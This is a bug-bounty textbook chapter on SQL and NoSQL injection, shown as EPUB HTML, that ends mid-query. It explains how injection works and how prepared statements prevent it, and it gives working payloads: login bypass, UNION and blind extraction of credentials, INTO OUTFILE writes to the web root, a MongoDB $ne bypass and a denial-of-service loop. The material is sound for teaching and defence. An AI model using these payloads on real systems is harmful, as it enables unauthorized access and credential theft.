<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
	<head>
		<title>Chapter 11: SQL Injection</title>
		<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:f533d35e-262b-449b-a78e-85650cfe86cd" name="Adept.expected.resource"/>
	</head>
	<body epub:type="bodymatter chapter">
		<section>
			<header>
				<h1 class="chapter"><span class="ChapterNumber"><span epub:type="pagebreak" id="Page_187" title="187"/>11</span><br/><span class="ChapterTitle">SQL Injection</span></h1>
			</header>
			<figure class="opener">
				<img alt="" src="image_fi/book_art/chapterart.png"/>
			</figure>
			<p class="ChapterIntro"><em>SQL</em> is a programming language used to query or modify information stored within a database. A <em>SQL injection </em>is an attack in which the attacker executes arbitrary SQL commands on an application’s database by supplying malicious input inserted into a SQL statement. This happens when the input used in SQL queries is incorrectly filtered or escaped and can lead to authentication bypass, sensitive data leaks, tampering of the database, and RCE in some cases.</p>
			<p>
				SQL injections are on the decline, since most web frameworks now have built-in mechanisms that protect against them. But they are still common. If you can find one, they tend to be critical vulnerabilities that result in high payouts, so when you first start hunting for vulnerabilities on a target, looking out for them is still worthwhile. In this chapter, we will talk about how <span epub:type="pagebreak" id="Page_188" title="188"/>to find and exploit two types of SQL injections: classic SQL injections and blind SQL injections. We will also talk about injections in NoSQL databases, which are databases that do not use the SQL query language.</p>
			<p>Note that the examples used in this chapter are based on MySQL syntax. The code for injecting commands into other database types will be slightly different, but the overall principles remain the same.</p>
			<h2 id="h1-501546c11-0001">Mechanisms</h2>
			<p>
				To understand SQL injections, let’s start by understanding what SQL is. <em>Structured Query Language (SQL) </em>is a language used to manage and communicate with databases.</p>
			<p>
				Traditionally, a <em>database</em> contains tables, rows, columns, and fields. The rows and columns contain the data, which gets stored in single fields. Let’s say that a web application’s database contains a table called Users (<a href="#table11-1" id="tableanchor11-1">Table 11-1</a>). This table contains three columns: ID, Username, and Password. It also contains three rows of data, each storing the credentials of a different user.</p>
			<figure>
				<figcaption class="TableTitle">
					<p><a id="table11-1">Table 11-1</a>: The Example Users Database Table</p>
				</figcaption>
				<table border="1" id="table-501546c11-0001">
					<thead>
						<tr>
							<td><b>ID</b></td>
							<td><b>Username</b></td>
							<td><b>Password</b></td>
						</tr>
					</thead>
					<tbody>
						<tr>
							<td><code>1</code></td>
							<td><em>admin</em></td>
							<td><code>t5dJ12rp$fMDEbSWz</code></td>
						</tr>
						<tr>
							<td><code>2</code></td>
							<td><em>vickie</em></td>
							<td><code>password123</code></td>
						</tr>
						<tr>
							<td><code>3</code></td>
							<td><em>jennifer</em></td>
							<td><code>letmein!</code></td>
						</tr>
					</tbody>
				</table>
			</figure>
			<p>
				The SQL language helps you efficiently interact with the data stored in databases by using queries. For example, SQL <code>SELECT</code> statements can be used to retrieve data from the database. The following query will return the entire Users table from the database:</p>
			<pre><code>SELECT * FROM Users;</code></pre>
			<p>This query would return all usernames in the Users table:</p>
			<pre><code>SELECT Username FROM Users;</code></pre>
			<p>
				Finally, this query would return all users with the username <em>admin</em>:</p>
			<pre><code>SELECT * FROM Users WHERE Username='admin';</code></pre>
			<p>
				There are many more ways to construct a SQL query that interacts with a database. You can learn more about SQL syntax from W3Schools at <a class="LinkURL" href="https://www.w3schools.com/sql/default.asp">https://www.w3schools.com/sql/default.asp</a>.</p>
			<h3 id="h2-501546c11-0001"><span epub:type="pagebreak" id="Page_189" title="189"/>Injecting Code into SQL Queries</h3>
			<p>A SQL injection attack occurs when an attacker is able to inject code into the SQL statements that the target web application uses to access its database, thereby executing whatever SQL code the attacker wishes. For example, let’s say that a website prompts its users for their username and password, then inserts these into a SQL query to log in the user. The following POST request parameters from the user will be used to populate a SQL query:</p>
			<pre><code>POST /login
Host: example.com
(POST request body)
username=vickie&amp;password=password123</code></pre>
			<p>This SQL query will find the ID of a user that matches the username and password provided in the POST request. The application will then log in to that user’s account:</p>
			<pre><code>SELECT Id FROM Users
WHERE Username='vickie' AND Password='password123';</code></pre>
			<p>So what’s the problem here? Since users can’t predict the passwords of others, they should have no way of logging in as others, right? The issue is that attackers can insert characters that are special to the SQL language to mess with the logic of the query. For example, if an attacker submits the following POST request:</p>
			<pre><code>POST /login
Host: example.com
(POST request body)
username="admin';-- "&amp;password=password123</code></pre>
			<p class="BodyContinued">the generated SQL query would become this:</p>
			<pre><code>SELECT Id FROM Users
WHERE Username='admin';-- ' AND Password='password123';</code></pre>
			<p>
				The <code>--</code> sequence denotes the start of a SQL comment, which doesn’t get interpreted as code, so by adding <code>--</code> into the username part of the query, the attacker effectively comments out the rest of the SQL query. The query becomes this:</p>
			<pre><code>SELECT Id FROM Users WHERE Username='admin';</code></pre>
			<p>This query will return the admin user’s ID, regardless of the password provided by the attacker. By injecting special characters into the SQL query, the attacker bypassed authentication and can log in as the admin without knowing the correct password!</p>
			<p><span epub:type="pagebreak" id="Page_190" title="190"/>Authentication bypass is not the only thing attackers can achieve with SQL injection. Attackers might also be able to retrieve data they shouldn’t be allowed to access. Let’s say a website allows users to access a list of their emails by providing the server a username and an access key to prove their identity:</p>
			<pre><code>GET /emails?username=vickie&amp;accesskey=ZB6w0YLjzvAVmp6zvr
Host: example.com</code></pre>
			<p>This GET request might generate a query to the database with the following SQL statement:</p>
			<pre><code>SELECT Title, Body FROM Emails
WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr';</code></pre>
			<p>In this case, attackers can use the SQL query to read data from other tables that they should not be able to read. For instance, imagine they sent the following HTTP request to the server:</p>
			<pre><code>GET /emails?username=vickie&amp;accesskey="ZB6w0YLjzvAVmp6zvr' <span aria-label="annotation1" class="CodeAnnotationHang">1</span> UNION SELECT Username, Password FROM Users;-- "
Host: example.com</code></pre>
			<p>The server would turn the original SQL query into this one:</p>
			<pre><code><span aria-label="annotation1" class="CodeAnnotationHang">1</span> SELECT Title, Body FROM Emails
WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr'<span aria-label="annotation2" class="CodeAnnotationHang">2</span> UNION <span aria-label="annotation3" class="CodeAnnotationHang">3</span>SELECT Username, Password FROM Users;<span aria-label="annotation4" class="CodeAnnotationHang">4</span>-- ;</code></pre>
			<p>
				The SQL <code>UNION</code> <span aria-label="annotation2" class="CodeAnnotation">2</span> operator combines the results of two different <code>SELECT</code> statements. Therefore, this query combines the results of the first <code>SELECT</code> statement <span aria-label="annotation1" class="CodeAnnotation">1</span>, which returns a user’s emails, and the second <code>SELECT</code> statement <span aria-label="annotation3" class="CodeAnnotation">3</span>, which, as described earlier, returns all usernames and passwords from the Users table. Now the attacker can read all users’ usernames and passwords in the HTTP response! (Note that many SQL injection payloads would comment out whatever comes after the injection point <span aria-label="annotation4" class="CodeAnnotation">4</span>, to prevent the rest of the query from messing up the syntax or logic of the query.)</p>
			<p>
				SQL injection isn’t limited to <code>SELECT</code> statements, either. Attackers can also inject code into statements like <code>UPDATE</code> (used to update a record), <code>DELETE</code> (used to delete existing records), and <code>INSERT</code> (used to create new entries in a table). For example, let’s say that this is the HTTP POST request used to update a user’s password on the target website:</p>
			<pre><code>POST /change_password
Host: example.com
(POST request body)
new_password=password12345</code></pre>
			<p><span epub:type="pagebreak" id="Page_191" title="191"/>The website would form an <code>UPDATE</code> query with your new password and the ID of the currently logged-in user. This query will update the row in the Users table whose ID field is equal to 2, and set its password to <code>password12345</code>:</p>
			<pre><code>UPDATE Users<b>SET</b> Password='password12345'
WHERE Id = 2;</code></pre>
			<p>
				In this case, attackers can control the <code>SET</code> clause of the statement, which is used to specify which rows should be updated in a table. The attacker can construct a POST request like this one:</p>
			<pre><code>POST /change_password
Host: example.com
(POST request body)
new_password="password12345';--"</code></pre>
			<p>This request generates the following SQL query:</p>
			<pre><code>UPDATE Users
SET Password='password12345';-- WHERE Id = 2;</code></pre>
			<p>
				The <code>WHERE</code> clause, which specifies the criteria of the rows that should be updated, is commented out in this query. The database would update all rows in the table, and change all of the passwords in the Users table to <code>password12345</code>. The attacker can now log in as anyone by using that password.</p>
			<h3 id="h2-501546c11-0002">Using Second-Order SQL Injections</h3>
			<p>
				So far, the SQL injections we’ve discussed are all first-order SQL injections. <em>First-order SQL injections</em> happen when applications use user-submitted input directly in a SQL query. On the other hand, <em>second-order SQL injections</em> happen when user input gets stored into a database, then retrieved and used unsafely in a SQL query. Even if applications handle input properly when it’s submitted by the user, these vulnerabilities can occur if the application mistakenly treats the data as safe when it’s retrieved from the database.</p>
			<p>For example, consider a web application that allows users to create an account by specifying a username and a password. Let’s say that a malicious user submits the following request:</p>
			<pre><code>POST /signup
Host: example.com
(POST request body)
username="vickie' UNION SELECT Username, Password FROM Users;-- 
"&amp;password=password123</code></pre>
			<p>
				This request submits the username <code>vickie' UNION SELECT Username, Password FROM Users;-- </code>and the password<code> password123</code> to the <em>/signup</em> endpoint. The <code>username</code> POST request parameter contains a SQL injection payload <span epub:type="pagebreak" id="Page_192" title="192"/>that would <code>SELECT</code> all usernames and passwords and concatenate them to the results of the database query.</p>
			<p>
				The application properly handles the user input when it’s submitted, using the protection techniques I’ll discuss in the next section. And the string <code>vickie' UNION SELECT Username, Password FROM Users;--</code> is stored into the application’s database as the attacker’s username.</p>
			<p>Later, the malicious user accesses their email with the following GET request:</p>
			<pre><code>GET /emails
Host: example.com</code></pre>
			<p>In this case, let’s say that if the user doesn’t provide a username and an access key, the application will retrieve the username of the currently logged-in user from the database and use it to populate a SQL query:</p>
			<pre><code>SELECT Title, Body FROM Emails
WHERE Username='USERNAME'</code></pre>
			<p>But the attacker’s username, which contains SQL code, will turn the SQL query into the following one:</p>
			<pre><code>SELECT Title, Body FROM Emails
WHERE Username='vickie'
UNION SELECT Username, Password FROM Users;--</code></pre>
			<p>This will return all usernames and passwords as email titles and bodies in the HTTP response!</p>
			<h2 id="h1-501546c11-0002">Prevention</h2>
			<p>
				Because SQL injections are so devastating to an application’s security, you must take action to prevent them. One way you can prevent SQL injections is by using prepared statements. <em>Prepared statements</em> are also called <em>parameterized queries</em>, and they make SQL injections virtually impossible.</p>
			<p>
				Before we dive into how prepared statements work, it’s important to understand how SQL queries are executed. SQL is a programming language, and your SQL query is essentially a program. When the SQL program arrives at the SQL server, the server will parse, compile, and optimize it. Finally, the server will execute the program and return the results of the execution (<a href="#figure11-1" id="figureanchor11-1">Figure 11-1</a>)<em>.</em></p>
			<figure>
				<img alt="f11001" class="" src="image_fi/501546c11/f11001.png"/>
				<figcaption>
					<p><a id="figure11-1">Figure 11-1</a>: Life of a SQL query</p>
				</figcaption>
			</figure>
			<p><span epub:type="pagebreak" id="Page_193" title="193"/>When you insert user-supplied input into your SQL queries, you are basically rewriting your program dynamically, using user input. An attacker can supply data that interferes with the program’s code and alter its logic (<a href="#figure11-2" id="figureanchor11-2">Figure 11-2</a>).</p>
			<figure>
				<img alt="f11002" class="" src="image_fi/501546c11/f11002.png"/>
				<figcaption>
					<p><a id="figure11-2">Figure 11-2</a>: A SQL query that concatenates user input into the query before compilation will make the database treat user input as code.</p>
				</figcaption>
			</figure>
			<p>
				Prepared statements work by making sure that user-supplied data does not alter your SQL query’s logic. These SQL statements are sent to and compiled by the SQL server before any user-supplied parameters are inserted. This means that instead of passing a complete SQL query to the server to be compiled, you define all the SQL logic first, compile it, and then insert user-supplied parameters into the query right before execution (<a href="#figure11-3" id="figureanchor11-3">Figure 11-3</a>). After the parameters are inserted into the final query, the query will not be parsed and compiled again.</p>
			<figure>
				<img alt="f11003" class="" src="image_fi/501546c11/f11003.png"/>
				<figcaption>
					<p><a id="figure11-3">Figure 11-3</a>: A SQL query that concatenates user input into the query after compilation allows the database to distinguish between the code part and the data part of the SQL query.</p>
				</figcaption>
			</figure>
			<p>Anything that wasn’t in the original statement will be treated as string data, not executable SQL code, so the program logic part of your SQL query will remain intact. This allows the database to distinguish between the code part and the data part of the SQL query, regardless of what the user input looks like.</p>
			<p>Let’s look at an example of how to execute SQL statements safely in PHP. Say that we want to retrieve a user’s ID by using their provided username and password, so we want to execute this SQL statement:</p>
			<pre><code>SELECT Id FROM Users
WHERE Username=USERNAME AND Password=PASSWORD;</code></pre>
			<p><span epub:type="pagebreak" id="Page_194" title="194"/>Here’s how to do that in PHP:</p>
			<pre><code>$mysqli = new mysqli("mysql_host", "mysql_username", "mysql_password", "database_name"); <span aria-label="annotation1" class="CodeAnnotationCode">1</span>
$username = $_POST["username"]; <span aria-label="annotation2" class="CodeAnnotationCode">2</span>
$password = $_POST["password"]; <span aria-label="annotation3" class="CodeAnnotationCode">3</span></code></pre>
			<p>
				In PHP, we first establish a connection with our database <span aria-label="annotation1" class="CodeAnnotation">1</span>, and then retrieve the username and password as POST parameters from the user <span aria-label="annotation2" class="CodeAnnotation">2</span><em> </em><span aria-label="annotation3" class="CodeAnnotation">3</span><em>.</em></p>
			<p>To use a prepared statement, you would define the structure of the query first. We’ll write out the query without its parameters, and put question marks as placeholders for the parameters:</p>
			<pre><code>$stmt = $mysqli-&gt;prepare(<b>"SELECT Id FROM Users WHERE Username=? AND Password=?"</b>);</code></pre>
			<p>This query string will now be compiled by the SQL server as SQL code. You can then send over the parameters of the query separately. The following line of code will insert the user input into the SQL query:</p>
			<pre><code>$stmt-&gt;bind_param("ss", $username, $password);</code></pre>
			<p>Finally, you execute the query:</p>
			<pre><code>$stmt-&gt;execute();</code></pre>
			<p>The username and password values provided by the user aren’t compiled like the statement template, and aren’t executed as the logic part of the SQL code. Therefore, if an attacker provides the application with a malicious input like this one, the entire input would be treated as plain data, not as SQL code:</p>
			<pre><code>Password12345';--</code></pre>
			<p>
				How to use prepared statements depends on the programming language you are using to code your applications. Wikipedia provides a few examples: <a class="LinkURL" href="https://en.wikipedia.org/wiki/Prepared_statement">https://en.wikipedia.org/wiki/Prepared_statement</a><em>.</em></p>
			<p>
				Another way of preventing SQL injections is to use an allowlist for allowed values. For example, the SQL <code>ORDER BY</code> clause allows a query to specify the column by which to sort the results. Therefore, this query will return all of the user’s emails in our table, sorted by the Date column, in descending order:</p>
			<pre><code>SELECT Title, Body FROM Emails
WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr';
ORDER BY Date DESC;</code></pre>
			<p>
				If the application allows users to specify a column to use for ordering their email, it can rely on an allowlist of column names for the <code>ORDER BY</code> clause instead of allowing arbitrary input from the user. For example, the application can allow only the values <code>Date</code>, <code>Sender</code>, and <code>Title</code>, and reject all other user-input values.</p>
			<p><span epub:type="pagebreak" id="Page_195" title="195"/>Finally, you can carefully sanitize and escape user input. However, this approach isn’t entirely bulletproof, because it’s easy to miss special characters that attackers could use to construct a SQL injection attack. Special characters that should be sanitized or escaped include the single quote (<code>'</code>) and double quote (<code>"</code>), but special characters specific to each type of database also exist. For more information about SQL input sanitization, read OWASP’s cheat sheet at <a class="LinkURL" href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a>.</p>
			<h2 id="h1-501546c11-0003">Hunting for SQL Injections</h2>
			<p>Let’s start hunting for SQL injections! Earlier in this chapter, I mentioned that we can classify SQL injections as either first order or second order. But there’s another way of classifying SQL injections that is useful when exploiting them: classic SQL injections, and blind SQL. The approach to detecting and exploiting these differs.</p>
			<p>
				Before we dive into each type, a common technique for detecting any SQL injection is to insert a single quote character (<code>'</code>) into every user input and look for errors or other anomalies. The single quote is a special character in SQL statements that denotes the end of a query string. If the application is protected against SQL injections, it should treat the single quote as plain data, and inserting a single quote into the input field should not trigger database errors or change the logic of the database query.</p>
			<p>
				Another general way of finding SQL injections is <em>fuzzing</em>, which is the practice of submitting specifically designed SQL injection payloads to the application and monitoring the server’s response. We will talk about this in <span class="xref" itemid="xref_target_Chapter 25">Chapter 25</span>.</p>
			<p>Otherwise, you can submit payloads designed for the target’s database intended to trigger a difference in database response, a time delay, or a database error. Remember, you’re looking for clues that the SQL code you injected can be executed.</p>
			<h3 id="h2-501546c11-0003">Step 1: Look for Classic SQL Injections</h3>
			<p><em>Classic SQL injections</em> are the easiest to find and exploit. In classic SQL injections, the results of the SQL query are returned directly to the attacker in an HTTP response. There are two subtypes: UNION based and error based.</p>
			<p>
				Our email example earlier is a case of the UNION-based approach: an attacker uses the <code>UNION</code> operator to concatenate the results of another query onto the web application’s response:</p>
			<pre><code>SELECT Title, Body FROM Emails
WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr'
UNION SELECT Username, Password FROM Users;-- ;</code></pre>
			<p>
				In this case, the server would return all usernames and passwords along with the user <em>vickie</em>’s emails in the HTTP response (<a href="#table11-2" id="tableanchor11-2">Table 11-2</a>).</p>
			<figure>
				<figcaption class="TableTitle">
					<p><a id="table11-2">Table 11-2</a>: Emails That Result from Our Malicious Query<span epub:type="pagebreak" id="Page_196" title="196"/></p>
				</figcaption>
				<table border="1" id="table-501546c11-0002">
					<thead>
						<tr>
							<td><b>Title</b></td>
							<td><b>Body</b></td>
						</tr>
					</thead>
					<tbody>
						<tr>
							<td>Finish setting up your account!</td>
							<td>
								Please finish setting up your <em>example.com</em> account by submitting a recovery email address.
							</td>
						</tr>
						<tr>
							<td>Welcome</td>
							<td>
								Welcome to <em>example.com</em>’s email service
							</td>
						</tr>
						<tr>
							<td>admin</td>
							<td>t5dJ12rp$fMDEbSWz</td>
						</tr>
						<tr>
							<td>vickie</td>
							<td>password123</td>
						</tr>
						<tr>
							<td>jennifer</td>
							<td>letmein!</td>
						</tr>
					</tbody>
				</table>
			</figure>
			<p>
				On the other hand, error-based SQL injection attacks trigger an error in the database to collect information from the returned error message. For example, we can induce an error by using the <code>CONVERT()</code> function in MySQL:</p>
			<pre><code>SELECT Title, Body FROM Emails
WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr'
UNION SELECT 1,
CONVERT((SELECT Password FROM Users WHERE Username="admin"), DATE); –-</code></pre>
			<p>
				The <code>CONVERT(</code><var>VALUE</var><code>, </code><var>FORMAT</var><code>)</code> function attempts to convert <var>VALUE</var> to the format specified by <var>FORMAT</var>. Therefore, this query will force the database to convert the admin’s password to a <code>date</code> format, which can sometimes cause the database to throw a descriptive error like this one:</p>
			<pre><code>Conversion failed when trying to convert "t5dJ12rp$fMDEbSWz" to data type "date".</code></pre>
			<p>
				The database throws descriptive errors to help developers pinpoint problems, but can also accidentally reveal information to outsiders if error messages are shown to regular users as well. In this example, the database points out that it has failed to convert a string value, <code>"t5dJ12rp$fMDEbSWz"</code>, to the <code>date</code> format. But <code>t5dJ12rp$fMDEbSWz</code> is the password of the admin account! By displaying a descriptive error message, the database has accidentally revealed a sensitive piece of information to outsiders.</p>
			<h3 id="h2-501546c11-0004">Step 2: Look for Blind SQL Injections</h3>
			<p>
				Also called<em> inferential SQL injections</em>, <em>blind SQL injections</em> are a little harder to detect and exploit. They happen when attackers cannot directly extract information from the database because the application doesn’t return SQL data or descriptive error messages. In this case, attackers can infer information by sending SQL injection payloads to the server and observing its subsequent behavior. Blind SQL injections have two subtypes as well: Boolean based and time based.</p>
			<p><em>Boolean-based SQL injection</em> occurs when attackers infer the structure of the database by injecting test conditions into the SQL query that will return either <code>true</code> or <code>false</code>. Using those responses, attackers could slowly infer the contents of the database. For example, let’s say that <em>example.com</em> maintains a separate table to keep track of the premium members on the platform. <span epub:type="pagebreak" id="Page_197" title="197"/>Premium members have access to advanced features, and their home pages display a <code>Welcome, premium member!</code> banner. The site determines who is premium by using a cookie that contains the user’s ID and matching it against a table of registered premium members. The GET request containing such a cookie might look like this:</p>
			<pre><code>GET /
Host: example.com
Cookie: user_id=2</code></pre>
			<p>The application uses this request to produce the following SQL query:</p>
			<pre><code>SELECT * FROM PremiumUsers WHERE Id='2';</code></pre>
			<p>
				If this query returns data, the user is a premium member, and the <code>Welcome, premium member!</code> banner will be displayed. Otherwise, the banner won’t be displayed. Let’s say your account isn’t premium. What would happen if you submit this user ID instead?</p>
			<pre><code>2' UNION SELECT Id FROM Users
WHERE Username = 'admin'
and SUBSTR(Password, 1, 1) ='a';--</code></pre>
			<p>Well, the query would become the following:</p>
			<pre><code>SELECT * FROM PremiumUsers WHERE Id='2'
UNION SELECT Id FROM Users
WHERE Username = 'admin'
and <span aria-label="annotation1" class="CodeAnnotationCode">1</span>SUBSTR(Password, 1, 1) = 'a';--</code></pre>
			<p>
				The <code>SUBSTR(</code><var>STRING</var><code>, </code><var>POSITION</var><code>, </code><var>LENGTH</var><code>)</code> function extracts a substring from the <var>STRING</var>, of a specified <var>LENGTH</var>, at the specified <var>POSITION</var> in that string. Therefore, <code>SUBSTR(Password, 1, 1)</code> <span aria-label="annotation1" class="CodeAnnotation">1</span> returns the first character of each user’s password. Since user 2 isn’t a premium member, whether this query returns data will depend on the second <code>SELECT</code> statement, which returns data if the admin account’s password starts with an <code>a</code>. This means you can brute-force the admin’s password; if you submit this user ID as a cookie, the web application would display the premium banner if the admin account’s password starts with an <code>a</code>. You could try this query with the letters <code>b</code>, <code>c</code>, and so on, until it works.</p>
			<p>
				You can use this technique to extract key pieces of information from the database, such as the database version, table names, column names, and credentials. I talk more about this in <span class="xref" itemid="xref_target_“Escalating the Attack”  on page 201">“Escalating the Attack”  on page 201</span>.</p>
			<p>
				A <em>time-based SQL injection</em> is similar, but instead of relying on a visual cue in the web application, the attacker relies on the response-time difference caused by different SQL injection payloads. For example, what might happen if the injection point from our preceding example doesn’t return any visual clues about the query’s results? Let’s say premium members don’t get a special banner, and their user interfaces don’t look any different. How do you exploit this SQL injection then?</p>
			<p><span epub:type="pagebreak" id="Page_198" title="198"/>In many databases, you can trigger a time delay by using a SQL query. If the time delay occurs, you’ll know the query worked correctly. Try using an <code>IF</code> statement in the SQL query:</p>
			<pre><code>IF(CONDITION, IF-TRUE, IF-FALSE)</code></pre>
			<p>For example, say you submit the following ID:</p>
			<pre><code>2' UNION SELECT
IF(SUBSTR(Password, 1, 1) = 'a', SLEEP(10), 0)
Password FROM Users
WHERE Username = 'admin';</code></pre>
			<p>The SQL query would become the following:</p>
			<pre><code>SELECT * FROM PremiumUsers WHERE Id='2'
UNION SELECT
IF(SUBSTR(Password, 1, 1) = 'a', SLEEP(10), 0)
Password FROM Users
WHERE Username = 'admin';</code></pre>
			<p>
				The <code>SLEEP(</code><var>SECONDS</var><code>)</code> function in MySQL will create a time delay in the response for the specified number of seconds. This query will instruct the database to sleep for 10 seconds if the admin’s password starts with an <code>a</code> character. Using this technique, you can slowly figure out the admin’s password.</p>
			<h3 id="h2-501546c11-0005">Step 3: Exfiltrate Information by Using SQL Injections</h3>
			<p>Imagine that the web application you’re attacking doesn’t use your input in a SQL query right away. Instead, it uses the input unsafely in a SQL query during a backend operation, so you have no way to retrieve the results of injection via an HTTP response, or infer the query’s results by observing server behavior. Sometimes there’s even a time delay between when you submitted the payload and when the payload gets used in an unsafe query, so you won’t immediately be able to observe differences in the application’s behavior.</p>
			<p>
				In this case, you’ll need to make the database store information somewhere when it does run the unsafe SQL query. In MySQL, the <code>SELECT. . .INTO</code> statement tells the database to store the results of a query in an output file on the local machine. For example, the following query will cause the database to write the admin’s password into <em>/var/www/html/output.txt</em>, a file located on the web root of the target web server:</p>
			<pre><code>SELECT Password FROM Users WHERE Username='admin'
INTO OUTFILE '/var/www/html/output.txt'</code></pre>
			<p>
				We upload to the <em>/var/www/html </em>directory because it’s the default web directory for many Linux web servers. Then you can simply access <span epub:type="pagebreak" id="Page_199" title="199"/>the information by navigating to the <em>/output.txt</em> page on the target: <em>https://example.com/output.txt</em>. This technique is also a good way to detect second-order SQL injections, since in second-order SQL injections, there is often a time delay between the malicious input and the SQL query being executed.</p>
			<p>
				Let’s put this information in context. Say that when you browse <em>example.com</em>, the application adds you to a database table to keep track of currently active users. Accessing a page with a cookie, like this</p>
			<pre><code>GET /
Host: example.com
Cookie: user_id=2, username=vickie</code></pre>
			<p class="BodyContinued">will cause the application to add you to a table of active users. In this example, the ActiveUsers table contains only two columns: one for the user ID and one for the username of the logged-in user. The application uses an <code>INSERT</code> statement to add you to the ActiveUsers table. <code>INSERT </code>statements add a row into the specified table with the specified values:</p>
			<pre><code>INSERT INTO ActiveUsers
VALUES ('2', 'vickie');</code></pre>
			<p>
				In this case, an attacker can craft a malicious cookie to inject into the <code>INSERT</code> statement:</p>
			<pre><code>GET /
Host: example.com
Cookie: <span aria-label="annotation1" class="CodeAnnotationCode">1</span>user_id="2', (SELECT Password FROM Users
WHERE Username='admin'
INTO OUTFILE '/var/www/html/output.txt'));-- ", username=vickie</code></pre>
			<p>
				This cookie <span aria-label="annotation1" class="CodeAnnotation">1</span> will, in turn, cause the <code>INSERT</code> statement to save the admin’s password into the <em>output.txt</em> file on the victim server:</p>
			<pre><code>INSERT INTO ActiveUsers
VALUES ('2', (SELECT Password FROM Users
WHERE Username='admin'
INTO OUTFILE '/var/www/html/output.txt'));-- ', 'vickie');</code></pre>
			<p>
				Finally, you will find the password of the admin account stored into the <em>output.txt</em> file on the target server.</p>
			<h3 id="h2-501546c11-0006">Step 4: Look for NoSQL Injections</h3>
			<p>
				Databases don’t always use SQL. <em>NoSQL</em>, or <em>Not Only SQL</em>, databases are those that don’t use the SQL language. Unlike SQL databases, which store data in tables, NoSQL databases store data in other structures, such as key-value pairs and graphs. NoSQL query syntax is database-specific, and queries are often written in the programming language of the application. Modern NoSQL databases, such as MongoDB, Apache CouchDB, and Apache Cassandra, are also vulnerable to injection attacks. These vulnerabilities are becoming more common as NoSQL rises in popularity.</p>
			<p><span epub:type="pagebreak" id="Page_200" title="200"/>Take MongoDB, for example. In MongoDB syntax, <code>Users.find()</code> returns users that meet a certain criteria. For example, the following query returns users with the username <code>vickie</code> and the password <code>password123</code>:</p>
			<pre><code>Users.find({username: 'vickie', password: 'password123'});</code></pre>
			<p>If the application uses this functionality to log in users and populates the database query directly with user input, like this:</p>
			<pre><code>Users.find({username: $username, password: $password});</code></pre>
			<p class="BodyContinued">attackers can submit the password <code>{$ne: ""}</code> to log in as anyone. For example, let’s say that the attacker submits a username of <code>admin</code> and a password of <code>{$ne: ""}</code>. The database query would become as follows:</p>
			<pre><code>Users.find({username: 'admin', password: {$ne: ""}});</code></pre>
			<p>
				In MongoDB, <code>$ne</code> selects objects whose value is not equal to the specified value. Here, the query would return users whose username is <code>admin</code> and password isn’t equal to an empty string, which is true unless the admin has a blank password! The attacker can thus bypass authentication and gain access to the admin account.</p>
			<p>
				Injecting into MongoDB queries can also allow attackers to execute arbitrary JavaScript code on the server. In MongoDB, the <code>$where</code>, <code>mapReduce</code>, <code>$accumulator</code>, and <code>$function</code> operations allow developers to run arbitrary JavaScript. For example, you can define a function within the <code>$where</code> operator to find users named <code>vickie</code>:</p>
			<pre><code>Users.find( { $where: function() { return (this.username == 'vickie') } } );</code></pre>
			<p>Say the developer allows unvalidated user input in this function and uses that to fetch account data, like this:</p>
			<pre><code>Users.find( { $where: function() { return (this.username == $user_input) } } );</code></pre>
			<p>
				In that case, an attacker can execute arbitrary JavaScript code by injecting it into the <code>$where</code> operation. For example, the following piece of malicious code will launch a denial-of-service (DoS) attack by triggering a never-ending <code>while</code> loop:</p>
			<pre><code>Users.find( { $where: function() { return (this.username == 'vickie'; while(true){};) } } );</code></pre>
			<p>
				The process of looking for NoSQL injections is similar to detecting SQL injections. You can insert special characters such as quotes (<code>' "</code>), semicolons (<code>;</code>), and backslashes (<code>\</code>), as well as parentheses (<code>()</code>), brackets(<code>[]</code>), and braces (<code>{}</code>) into user-input fields and look for errors or other anomalies. You can also automate the hunting process by using the tool NoSQLMap (<a class="LinkURL" href="https://github.com/codingo/NoSQLMap/">https://github.com/codingo/NoSQLMap/</a>).</p>
			<p><span epub:type="pagebreak" id="Page_201" title="201"/>Developers can prevent NoSQL injection attacks by validating user input and avoiding dangerous database functionalities. In MongoDB, you can disable the running of server-side JavaScript by using the <code>--noscripting</code> option in the command line or setting the <code>security.javascriptEnabled</code> flag in the configuration file to <code>false</code>. Find more information at <a class="LinkURL" href="https://docs.mongodb.com/manual/faq/fundamentals/index.html">https://docs.mongodb.com/manual/faq/fundamentals/index.html</a>.</p>
			<p>
				Additionally, you should follow the <em>principle of least privilege</em> when assigning rights to applications. This means that applications should run with only the privileges they require to operate. For example, when an application requires only read access to a file, it should not be granted any write or execute permissions. This will lower your risk of complete system compromise during an attack.</p>
			<h2 id="h1-501546c11-0004">Escalating the Attack</h2>
			<p>Attackers most often use SQL injections to extract information from the database. Successfully collecting data from a SQL injection is a technical task that can sometimes be complicated. Here are some tips you can use to gain information about a target for exploitation.</p>
			<h3 id="h2-501546c11-0007">Learn About the Database</h3>
			<p>First, it’s useful to gain information about the structure of the database. Notice that many of the payloads that I’ve used in this chapter require some knowledge of the database, such as table names and field names.</p>
			<p>To start with, you need to determine the database software and its structure. Attempt some trial-and-error SQL queries to determine the database version. Each type of database will have different functions for returning their version numbers, but the query should look something like this:</p>
			<pre><code>SELECT Title, Body FROM Emails
WHERE Username='vickie'
UNION SELECT 1, @@version;--</code></pre>
			<p>
				Some common commands for querying the version type are <code>@@version</code> for Microsoft SQL Server and MySQL, <code>version()</code> for PostgreSQL, and <code>v$version</code> for Oracle. The <code>1</code> in the <code>UNION SELECT 1, </code><var>DATABASE_VERSION_QUERY</var><code>;--</code> line is necessary, because for a <code>UNION</code> statement to work, the two <code>SELECT</code> statements it connects need to have the same number of columns. The first <code>1</code> is essentially a dummy column name that you can use to match column numbers.</p>
			<p>Once you know the kind of database you’re working with, you could start to scope it out further to see what it contains. This query in MySQL will show you the table names of user-defined tables:</p>
			<pre><code>SELECT Title, Body FROM Emails
WHERE Username='vickie'
